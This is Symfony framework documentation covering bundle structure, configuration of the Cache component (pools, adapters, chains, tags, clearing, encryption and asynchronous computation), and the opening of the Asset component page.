    class AcmeBlogBundle extends AbstractBundle
    {
    }

.. caution::

    If your bundle must be compatible with previous Symfony versions you have to
    extend from the :class:`Symfony\\Component\\HttpKernel\\Bundle\\Bundle` instead.

.. tip::

    The name AcmeBlogBundle follows the standard
    :ref:`Bundle naming conventions <bundles-naming-conventions>`. You could
    also choose to shorten the name of the bundle to simply BlogBundle by naming
    this class BlogBundle (and naming the file ``BlogBundle.php``).

This empty class is the only piece you need to create the new bundle. Though
commonly empty, this class is powerful and can be used to customize the behavior
of the bundle. Now that you've created the bundle, enable it::

    // config/bundles.php
    return [
        // ...
        Acme\BlogBundle\AcmeBlogBundle::class => ['all' => true],
    ];

And while it doesn't do anything yet, AcmeBlogBundle is now ready to be used.

Bundle Directory Structure
--------------------------

The directory structure of a bundle is meant to help to keep code consistent
between all Symfony bundles. It follows a set of conventions, but is flexible
to be adjusted if needed:

``assets/``
    Contains the web asset sources like JavaScript and TypeScript files, CSS and
    Sass files, but also images and other assets related to the bundle that are
    not in ``public/`` (e.g. Stimulus controllers).

``config/``
    Houses configuration, including routing configuration (e.g. ``routes.php``).

``public/``
    Contains web assets (images, compiled CSS and JavaScript files, etc.) and is
    copied or symbolically linked into the project ``public/`` directory via the
    ``assets:install`` console command.

``src/``
    Contains all PHP classes related to the bundle logic (e.g. ``Controller/CategoryController.php``).

``templates/``
    Holds templates organized by controller name (e.g. ``category/show.html.twig``).

``tests/``
    Holds all tests for the bundle.

``translations/``
    Holds translations organized by domain and locale (e.g. ``AcmeBlogBundle.en.xlf``).

.. caution::

    The recommended bundle structure was changed in Symfony 5, read the
    `Symfony 4.4 bundle documentation`_ for information about the old
    structure.

    When using the new ``AbstractBundle`` class, the bundle defaults to the
    new structure. Override the ``Bundle::getPath()`` method to change to
    the old structure::

        class AcmeBlogBundle extends AbstractBundle
        {
            public function getPath(): string
            {
                return __DIR__;
            }
        }

.. tip::

    It's recommended to use the `PSR-4`_ autoload standard: use the namespace as key,
    and the location of the bundle's main class (relative to ``composer.json``)
    as value. As the main class is located in the ``src/`` directory of the bundle:

    .. code-block:: json

        {
            "autoload": {
                "psr-4": {
                    "Acme\\BlogBundle\\": "src/"
                }
            },
            "autoload-dev": {
                "psr-4": {
                    "Acme\\BlogBundle\\Tests\\": "tests/"
                }
            }
        }

Learn more
----------

* :doc:`/bundles/override`
* :doc:`/bundles/best_practices`
* :doc:`/bundles/configuration`
* :doc:`/bundles/extension`
* :doc:`/bundles/prepend_extension`

.. _`third-party bundles`: https://github.com/search?q=topic%3Asymfony-bundle&type=Repositories
.. _`Symfony 4.4 bundle documentation`: https://symfony.com/doc/4.4/bundles.html#bundle-directory-structure
.. _`PSR-4`: https://www.php-fig.org/psr/psr-4/
Cache
=====

Using a cache is a great way of making your application run quicker. The Symfony cache
component ships with many adapters to different storages. Every adapter is
developed for high performance.

The following example shows a typical usage of the cache::

    use Symfony\Contracts\Cache\ItemInterface;

    // The callable will only be executed on a cache miss.
    $value = $pool->get('my_cache_key', function (ItemInterface $item): string {
        $item->expiresAfter(3600);

        // ... do some HTTP request or heavy computations
        $computedValue = 'foobar';

        return $computedValue;
    });

    echo $value; // 'foobar'

    // ... and to remove the cache key
    $pool->delete('my_cache_key');

Symfony supports Cache Contracts and PSR-6/16 interfaces.
You can read more about these at the :doc:`component documentation </components/cache>`.

.. _cache-configuration-with-frameworkbundle:

Configuring Cache with FrameworkBundle
--------------------------------------

When configuring the cache component there are a few concepts you should know
of:

**Pool**
    This is a service that you will interact with. Each pool will always have
    its own namespace and cache items. There is never a conflict between pools.
**Adapter**
    An adapter is a *template* that you use to create pools.
**Provider**
    A provider is a service that some adapters use to connect to the storage.
    Redis and Memcached are examples of such adapters. If a DSN is used as the
    provider then a service is automatically created.

.. _cache-app-system:

There are two pools that are always enabled by default. They are ``cache.app`` and
``cache.system``. The system cache is used for things like annotations, serializer,
and validation. The ``cache.app`` can be used in your code. You can configure which
adapter (template) they use by using the ``app`` and ``system`` key like:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/cache.yaml
        framework:
            cache:
                app: cache.adapter.filesystem
                system: cache.adapter.system

    .. code-block:: xml

        <!-- config/packages/cache.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:cache
                    app="cache.adapter.filesystem"
                    system="cache.adapter.system"
                />
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/cache.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->cache()
                ->app('cache.adapter.filesystem')
                ->system('cache.adapter.system')
            ;
        };

.. tip::

    While it is possible to reconfigure the ``system`` cache, it's recommended
    to keep the default configuration applied to it by Symfony.

The Cache component comes with a series of adapters pre-configured:

* :doc:`cache.adapter.apcu </components/cache/adapters/apcu_adapter>`
* :doc:`cache.adapter.array </components/cache/adapters/array_cache_adapter>`
* :doc:`cache.adapter.doctrine_dbal </components/cache/adapters/doctrine_dbal_adapter>`
* :doc:`cache.adapter.filesystem </components/cache/adapters/filesystem_adapter>`
* :doc:`cache.adapter.memcached </components/cache/adapters/memcached_adapter>`
* :doc:`cache.adapter.pdo </components/cache/adapters/pdo_adapter>`
* :doc:`cache.adapter.psr6 </components/cache/adapters/proxy_adapter>`
* :doc:`cache.adapter.redis </components/cache/adapters/redis_adapter>`
* :ref:`cache.adapter.redis_tag_aware <redis-tag-aware-adapter>` (Redis adapter optimized to work with tags)

.. note::

    There's also a special ``cache.adapter.system`` adapter. It's recommended to
    use it for the :ref:`system cache <cache-app-system>`. This adapter uses some
    logic to dynamically select the best possible storage based on your system
    (either PHP files or APCu).

Some of these adapters could be configured via shortcuts.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/cache.yaml
        framework:
            cache:
                directory: '%kernel.cache_dir%/pools' # Only used with cache.adapter.filesystem

                default_doctrine_dbal_provider: 'doctrine.dbal.default_connection'
                default_psr6_provider: 'app.my_psr6_service'
                default_redis_provider: 'redis://localhost'
                default_memcached_provider: 'memcached://localhost'
                default_pdo_provider: 'pgsql:host=localhost'

    .. code-block:: xml

        <!-- config/packages/cache.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <!-- "directory" attribute is only used with cache.adapter.filesystem -->
                <framework:cache directory="%kernel.cache_dir%/pools"
                    default-doctrine-dbal-provider="doctrine.dbal.default_connection"
                    default-psr6-provider="app.my_psr6_service"
                    default-redis-provider="redis://localhost"
                    default-memcached-provider="memcached://localhost"
                    default-pdo-provider="pgsql:host=localhost"
                />
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/cache.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->cache()
                // Only used with cache.adapter.filesystem
                ->directory('%kernel.cache_dir%/pools')

                ->defaultDoctrineDbalProvider('doctrine.dbal.default_connection')
                ->defaultPsr6Provider('app.my_psr6_service')
                ->defaultRedisProvider('redis://localhost')
                ->defaultMemcachedProvider('memcached://localhost')
                ->defaultPdoProvider('pgsql:host=localhost')
            ;
        };

.. versionadded:: 7.1

    Using a DSN as the provider for the PDO adapter was introduced in Symfony 7.1.

.. _cache-create-pools:

Creating Custom (Namespaced) Pools
----------------------------------

You can also create more customized pools:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/cache.yaml
        framework:
            cache:
                default_memcached_provider: 'memcached://localhost'

                pools:
                    # creates a "custom_thing.cache" service
                    # autowireable via "CacheInterface $customThingCache"
                    # uses the "app" cache configuration
                    custom_thing.cache:
                        adapter: cache.app

                    # creates a "my_cache_pool" service
                    # autowireable via "CacheInterface $myCachePool"
                    my_cache_pool:
                        adapter: cache.adapter.filesystem

                    # uses the default_memcached_provider from above
                    acme.cache:
                        adapter: cache.adapter.memcached

                    # control adapter's configuration
                    foobar.cache:
                        adapter: cache.adapter.memcached
                        provider: 'memcached://user:password@example.com'

                    # uses the "foobar.cache" pool as its backend but controls
                    # the lifetime and (like all pools) has a separate cache namespace
                    short_cache:
                        adapter: foobar.cache
                        default_lifetime: 60

    .. code-block:: xml

        <!-- config/packages/cache.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:cache default-memcached-provider="memcached://localhost">
                    <!-- creates a "custom_thing.cache" service
                         autowireable via "CacheInterface $customThingCache"
                         uses the "app" cache configuration -->
                    <framework:pool name="custom_thing.cache" adapter="cache.app"/>

                    <!-- creates a "my_cache_pool" service
                         autowireable via "CacheInterface $myCachePool" -->
                    <framework:pool name="my_cache_pool" adapter="cache.adapter.filesystem"/>

                    <!-- uses the default_memcached_provider from above -->
                    <framework:pool name="acme.cache" adapter="cache.adapter.memcached"/>

                    <!-- control adapter's configuration -->
                    <framework:pool name="foobar.cache" adapter="cache.adapter.memcached"
                        provider="memcached://user:password@example.com"
                    />

                    <!-- uses the "foobar.cache" pool as its backend but controls
                         the lifetime and (like all pools) has a separate cache namespace -->
                    <framework:pool name="short_cache" adapter="foobar.cache" default-lifetime="60"/>
                </framework:cache>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/cache.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $cache = $framework->cache();
            $cache->defaultMemcachedProvider('memcached://localhost');

            // creates a "custom_thing.cache" service
            // autowireable via "CacheInterface $customThingCache"
            // uses the "app" cache configuration
            $cache->pool('custom_thing.cache')
                ->adapters(['cache.app']);

            // creates a "my_cache_pool" service
            // autowireable via "CacheInterface $myCachePool"
            $cache->pool('my_cache_pool')
                ->adapters(['cache.adapter.filesystem']);

            // uses the default_memcached_provider from above
            $cache->pool('acme.cache')
                ->adapters(['cache.adapter.memcached']);

             // control adapter's configuration
            $cache->pool('foobar.cache')
                ->adapters(['cache.adapter.memcached'])
                ->provider('memcached://user:password@example.com');

            $cache->pool('short_cache')
                ->adapters(['foobar.cache'])
                ->defaultLifetime(60);
        };

Each pool manages a set of independent cache keys: keys from different pools
*never* collide, even if they share the same backend. This is achieved by prefixing
keys with a namespace that's generated by hashing the name of the pool, the name
of the cache adapter class and a :ref:`configurable seed <reference-cache-prefix-seed>`
that defaults to the project directory and compiled container class.

Each custom pool becomes a service whose service ID is the name of the pool
(e.g. ``custom_thing.cache``). An autowiring alias is also created for each pool
using the camel case version of its name - e.g. ``custom_thing.cache`` can be
injected automatically by naming the argument ``$customThingCache`` and type-hinting it
with either :class:`Symfony\\Contracts\\Cache\\CacheInterface` or
``Psr\Cache\CacheItemPoolInterface``::

    use Symfony\Contracts\Cache\CacheInterface;
    // ...

    // from a controller method
    public function listProducts(CacheInterface $customThingCache): Response
    {
        // ...
    }

    // in a service
    public function __construct(private CacheInterface $customThingCache)
    {
        // ...
    }

.. tip::

    If you need the namespace to be interoperable with a third-party app,
    you can take control over auto-generation by setting the ``namespace``
    attribute of the ``cache.pool`` service tag. For example, you can
    override the service definition of the adapter:

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            services:
                # ...

                app.cache.adapter.redis:
                    parent: 'cache.adapter.redis'
                    tags:
                        - { name: 'cache.pool', namespace: 'my_custom_namespace' }

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd"
            >
                <services>
                    <!-- ... -->

                    <service id="app.cache.adapter.redis" parent="cache.adapter.redis">
                        <tag name="cache.pool" namespace="my_custom_namespace"/>
                    </service>
                </services>
            </container>

        .. code-block:: php

            // config/services.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            return function(ContainerConfigurator $container): void {
                $container->services()
                    // ...

                    ->set('app.cache.adapter.redis')
                        ->parent('cache.adapter.redis')
                        ->tag('cache.pool', ['namespace' => 'my_custom_namespace'])
                ;
            };

Custom Provider Options
-----------------------

Some providers have specific options that can be configured. The
:doc:`RedisAdapter </components/cache/adapters/redis_adapter>` allows you to
create providers with the options ``timeout``, ``retry_interval``. etc. To use these
options with non-default values you need to create your own ``\Redis`` provider
and use that when configuring the pool.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/cache.yaml
        framework:
            cache:
                pools:
                    cache.my_redis:
                        adapter: cache.adapter.redis
                        provider: app.my_custom_redis_provider

        services:
            app.my_custom_redis_provider:
                class: \Redis
                factory: ['Symfony\Component\Cache\Adapter\RedisAdapter', 'createConnection']
                arguments:
                    - 'redis://localhost'
                    - { retry_interval: 2, timeout: 10 }

    .. code-block:: xml

        <!-- config/packages/cache.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:cache>
                    <framework:pool name="cache.my_redis"
                        adapter="cache.adapter.redis"
                        provider="app.my_custom_redis_provider"
                    />
                </framework:cache>
            </framework:config>

            <services>
                <service id="app.my_custom_redis_provider" class="\Redis">
                    <factory class="Symfony\Component\Cache\Adapter\RedisAdapter" method="createConnection"/>
                    <argument>redis://localhost</argument>
                    <argument type="collection">
                        <argument key="retry_interval">2</argument>
                        <argument key="timeout">10</argument>
                    </argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/packages/cache.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\Cache\Adapter\RedisAdapter;
        use Symfony\Component\DependencyInjection\ContainerBuilder;
        use Symfony\Config\FrameworkConfig;

        return static function (ContainerBuilder $container, FrameworkConfig $framework): void {
            $framework->cache()
                ->pool('cache.my_redis')
                    ->adapters(['cache.adapter.redis'])
                    ->provider('app.my_custom_redis_provider');

            $container->register('app.my_custom_redis_provider', \Redis::class)
                ->setFactory([RedisAdapter::class, 'createConnection'])
                ->addArgument('redis://localhost')
                ->addArgument([
                    'retry_interval' => 2,
                    'timeout' => 10
                ])
            ;
        };

Creating a Cache Chain
----------------------

Different cache adapters have different strengths and weaknesses. Some might be
really quick but optimized to store small items and some may be able to contain
a lot of data but are quite slow. To get the best of both worlds you may use a
chain of adapters.

A cache chain combines several cache pools into a single one. When storing an
item in a cache chain, Symfony stores it in all pools sequentially. When
retrieving an item, Symfony tries to get it from the first pool. If it's not
found, it tries the next pools until the item is found or an exception is thrown.
Because of this behavior, it's recommended to define the adapters in the chain
in order from fastest to slowest.

If an error happens when storing an item in a pool, Symfony stores it in the
other pools and no exception is thrown. Later, when the item is retrieved,
Symfony stores the item automatically in all the missing pools.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/cache.yaml
        framework:
            cache:
                pools:
                    my_cache_pool:
                        default_lifetime: 31536000  # One year
                        adapters:
                          - cache.adapter.array
                          - cache.adapter.apcu
                          - {name: cache.adapter.redis, provider: 'redis://user:password@example.com'}

    .. code-block:: xml

        <!-- config/packages/cache.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:cache>
                    <framework:pool name="my_cache_pool"
                        default-lifetime="31536000"> <!-- One year -->
                        <framework:adapter name="cache.adapter.array"/>
                        <framework:adapter name="cache.adapter.apcu"/>
                        <framework:adapter name="cache.adapter.redis" provider="redis://user:password@example.com"/>
                    </framework:pool>
                </framework:cache>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/cache.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->cache()
                ->pool('my_cache_pool')
                    ->defaultLifetime(31536000) // One year
                    ->adapters([
                        'cache.adapter.array',
                        'cache.adapter.apcu',
                        ['name' => 'cache.adapter.redis', 'provider' => 'redis://user:password@example.com'],
                    ])
            ;
        };

Using Cache Tags
----------------

In applications with many cache keys it could be useful to organize the data stored
to be able to invalidate the cache more efficiently. One way to achieve that is to
use cache tags. One or more tags could be added to the cache item. All items with
the same key could be invalidated with one function call::

    use Symfony\Contracts\Cache\ItemInterface;
    use Symfony\Contracts\Cache\TagAwareCacheInterface;

    class SomeClass
    {
        // using autowiring to inject the cache pool
        public function __construct(
            private TagAwareCacheInterface $myCachePool,
        ) {
        }

        public function someMethod(): void
        {
            $value0 = $this->myCachePool->get('item_0', function (ItemInterface $item): string {
                $item->tag(['foo', 'bar']);

                return 'debug';
            });

            $value1 = $this->myCachePool->get('item_1', function (ItemInterface $item): string {
                $item->tag('foo');

                return 'debug';
            });

            // Remove all cache keys tagged with "bar"
            $this->myCachePool->invalidateTags(['bar']);
        }
    }

The cache adapter needs to implement :class:`Symfony\\Contracts\\Cache\\TagAwareCacheInterface`
to enable this feature. This could be added by using the following configuration.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/cache.yaml
        framework:
            cache:
                pools:
                    my_cache_pool:
                        adapter: cache.adapter.redis
                        tags: true

    .. code-block:: xml

        <!-- config/packages/cache.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:cache>
                    <framework:pool name="my_cache_pool"
                        adapter="cache.adapter.redis"
                        tags="true"
                    />
                </framework:cache>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/cache.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->cache()
                ->pool('my_cache_pool')
                    ->tags(true)
                    ->adapters(['cache.adapter.redis'])
            ;
        };

Tags are stored in the same pool by default. This is good in most scenarios. But
sometimes it might be better to store the tags in a different pool. That could be
achieved by specifying the adapter.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/cache.yaml
        framework:
            cache:
                pools:
                    my_cache_pool:
                        adapter: cache.adapter.redis
                        tags: tag_pool
                    tag_pool:
                        adapter: cache.adapter.apcu

    .. code-block:: xml

        <!-- config/packages/cache.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:cache>
                    <framework:pool name="my_cache_pool"
                        adapter="cache.adapter.redis"
                        tags="tag_pool"
                    />
                    <framework:pool name="tag_pool" adapter="cache.adapter.apcu"/>
                </framework:cache>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/cache.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->cache()
                ->pool('my_cache_pool')
                    ->tags('tag_pool')
                    ->adapters(['cache.adapter.redis'])
            ;

            $framework->cache()
                ->pool('tag_pool')
                    ->adapters(['cache.adapter.apcu'])
            ;
        };

.. note::

    The interface :class:`Symfony\\Contracts\\Cache\\TagAwareCacheInterface` is
    autowired to the ``cache.app`` service.

Clearing the Cache
------------------

To clear the cache you can use the ``bin/console cache:pool:clear [pool]`` command.
That will remove all the entries from your storage and you will have to recalculate
all the values. You can also group your pools into "cache clearers". There are 3 cache
clearers by default:

* ``cache.global_clearer``
* ``cache.system_clearer``
* ``cache.app_clearer``

The global clearer clears all the cache items in every pool. The system cache clearer
is used in the ``bin/console cache:clear`` command. The app clearer is the default
clearer.

To see all available cache pools:

.. code-block:: terminal

    $ php bin/console cache:pool:list

Clear one pool:

.. code-block:: terminal

    $ php bin/console cache:pool:clear my_cache_pool

Clear all custom pools:

.. code-block:: terminal

    $ php bin/console cache:pool:clear cache.app_clearer

Clear all cache pools:

.. code-block:: terminal

    $ php bin/console cache:pool:clear --all

Clear all cache pools except some:

.. code-block:: terminal

    $ php bin/console cache:pool:clear --all --exclude=my_cache_pool --exclude=another_cache_pool

Clear all caches everywhere:

.. code-block:: terminal

    $ php bin/console cache:pool:clear cache.global_clearer

Clear cache by tag(s):

.. code-block:: terminal

    # invalidate tag1 from all taggable pools
    $ php bin/console cache:pool:invalidate-tags tag1

    # invalidate tag1 & tag2 from all taggable pools
    $ php bin/console cache:pool:invalidate-tags tag1 tag2

    # invalidate tag1 & tag2 from cache.app pool
    $ php bin/console cache:pool:invalidate-tags tag1 tag2 --pool=cache.app

    # invalidate tag1 & tag2 from cache1 & cache2 pools
    $ php bin/console cache:pool:invalidate-tags tag1 tag2 -p cache1 -p cache2

Encrypting the Cache
--------------------

To encrypt the cache using ``libsodium``, you can use the
:class:`Symfony\\Component\\Cache\\Marshaller\\SodiumMarshaller`.

First, you need to generate a secure key and add it to your :doc:`secret
store </configuration/secrets>` as ``CACHE_DECRYPTION_KEY``:

.. code-block:: terminal

    $ php -r 'echo base64_encode(sodium_crypto_box_keypair());'

Then, register the ``SodiumMarshaller`` service using this key:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/cache.yaml

        # ...
        services:
            Symfony\Component\Cache\Marshaller\SodiumMarshaller:
                decorates: cache.default_marshaller
                arguments:
                    - ['%env(base64:CACHE_DECRYPTION_KEY)%']
                    # use multiple keys in order to rotate them
                    #- ['%env(base64:CACHE_DECRYPTION_KEY)%', '%env(base64:OLD_CACHE_DECRYPTION_KEY)%']
                    - '@.inner'

    .. code-block:: xml

        <!-- config/packages/cache.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->

            <services>
                <service id="Symfony\Component\Cache\Marshaller\SodiumMarshaller" decorates="cache.default_marshaller">
                    <argument type="collection">
                        <argument>env(base64:CACHE_DECRYPTION_KEY)</argument>
                        <!-- use multiple keys in order to rotate them -->
                        <!-- <argument>env(base64:OLD_CACHE_DECRYPTION_KEY)</argument> -->
                    </argument>
                    <argument type="service" id=".inner"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/packages/cache.php
        use Symfony\Component\Cache\Marshaller\SodiumMarshaller;
        use Symfony\Component\DependencyInjection\ChildDefinition;
        use Symfony\Component\DependencyInjection\Reference;

        // ...
        $container->setDefinition(SodiumMarshaller::class, new ChildDefinition('cache.default_marshaller'))
            ->addArgument(['env(base64:CACHE_DECRYPTION_KEY)'])
            // use multiple keys in order to rotate them
            //->addArgument(['env(base64:CACHE_DECRYPTION_KEY)', 'env(base64:OLD_CACHE_DECRYPTION_KEY)'])
            ->addArgument(new Reference('.inner'));

.. caution::

    This will encrypt the values of the cache items, but not the cache keys. Be
    careful not to leak sensitive data in the keys.

When configuring multiple keys, the first key will be used for reading and
writing, and the additional key(s) will only be used for reading. Once all
cache items encrypted with the old key have expired, you can completely remove
``OLD_CACHE_DECRYPTION_KEY``.

Computing Cache Values Asynchronously
-------------------------------------

The Cache component uses the `probabilistic early expiration`_ algorithm to
protect against the :ref:`cache stampede <cache_stampede-prevention>` problem.
This means that some cache items are elected for early-expiration while they are
still fresh.

By default, expired cache items are computed synchronously. However, you can
compute them asynchronously by delegating the value computation to a background
worker using the :doc:`Messenger component </components/messenger>`. In this case,
when an item is queried, its cached value is immediately returned and a
:class:`Symfony\\Component\\Cache\\Messenger\\EarlyExpirationMessage` is
dispatched through a Messenger bus.

When this message is handled by a message consumer, the refreshed cache value is
computed asynchronously. The next time the item is queried, the refreshed value
will be fresh and returned.

First, create a service that will compute the item's value::

    // src/Cache/CacheComputation.php
    namespace App\Cache;

    use Symfony\Contracts\Cache\ItemInterface;

    class CacheComputation
    {
        public function compute(ItemInterface $item): string
        {
            $item->expiresAfter(5);

            // this is just a random example; here you must do your own calculation
            return sprintf('#%06X', mt_rand(0, 0xFFFFFF));
        }
    }

This cache value will be requested from a controller, another service, etc.
In the following example, the value is requested from a controller::

    // src/Controller/CacheController.php
    namespace App\Controller;

    use App\Cache\CacheComputation;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\Routing\Attribute\Route;
    use Symfony\Contracts\Cache\CacheInterface;
    use Symfony\Contracts\Cache\ItemInterface;

    class CacheController extends AbstractController
    {
        #[Route('/cache', name: 'cache')]
        public function index(CacheInterface $asyncCache): Response
        {
            // pass to the cache the service method that refreshes the item
            $cachedValue = $asyncCache->get('my_value', [CacheComputation::class, 'compute'])

            // ...
        }
    }

Finally, configure a new cache pool (e.g. called ``async.cache``) that will use
a message bus to compute values in a worker:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            cache:
                pools:
                    async.cache:
                        early_expiration_message_bus: messenger.default_bus

            messenger:
                transports:
                    async_bus: '%env(MESSENGER_TRANSPORT_DSN)%'
                routing:
                    'Symfony\Component\Cache\Messenger\EarlyExpirationMessage': async_bus

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xmlns:framework="http://symfony.com/schema/dic/symfony"
           xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:cache>
                    <framework:pool name="async.cache" early-expiration-message-bus="messenger.default_bus"/>
                </framework:cache>

                <framework:messenger>
                    <framework:transport name="async_bus">%env(MESSENGER_TRANSPORT_DSN)%</framework:transport>
                    <framework:routing message-class="Symfony\Component\Cache\Messenger\EarlyExpirationMessage">
                        <framework:sender service="async_bus"/>
                    </framework:routing>
                </framework:messenger>
            </framework:config>
        </container>

    .. code-block:: php

        // config/framework/framework.php
        use function Symfony\Component\DependencyInjection\Loader\Configurator\env;
        use Symfony\Component\Cache\Messenger\EarlyExpirationMessage;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->cache()
                ->pool('async.cache')
                    ->earlyExpirationMessageBus('messenger.default_bus');

            $framework->messenger()
                ->transport('async_bus')
                    ->dsn(env('MESSENGER_TRANSPORT_DSN'))
                ->routing(EarlyExpirationMessage::class)
                    ->senders(['async_bus']);
        };

You can now start the consumer:

.. code-block:: terminal

    $ php bin/console messenger:consume async_bus

That's it! Now, whenever an item is queried from this cache pool, its cached
value will be returned immediately. If it is elected for early-expiration, a
message will be sent through to bus to schedule a background computation to refresh
the value.

.. _`probabilistic early expiration`: https://en.wikipedia.org/wiki/Cache_stampede#Probabilistic_early_expiration
The Asset Component
===================

    The Asset component manages URL generation and versioning of web assets such
    as CSS stylesheets, JavaScript files and image files.

In the past, it was common for web applications to hard-code the URLs of web assets.
For example:

.. code-block:: html

    <link rel="stylesheet" type="text/css" href="/css/main.css">

    <!-- ... -->

    <a href="/"><img src="/images/logo.png" alt="logo"></a>

This practice is no longer recommended unless the web application is extremely
simple. Hardcoding URLs can be a disadvantage because:

* **Templates get verbose**: you have to write the full path for each
  asset. When using the Asset component, you can group assets in packages to
  avoid repeating the common part of their path;
* **Versioning is difficult**: it has to be custom managed for each
  application. Adding a version (e.g. ``main.css?v=5``) to the asset URLs
  is essential for some applications because it allows you to control how
  the assets are cached. The Asset component allows you to define different
  versioning strategies for each package;
* **Moving assets' location** is cumbersome and error-prone: it requires you to
  carefully update the URLs of all assets included in all templates. The Asset
  component allows to move assets effortlessly just by changing the base path
  value associated with the package of assets;
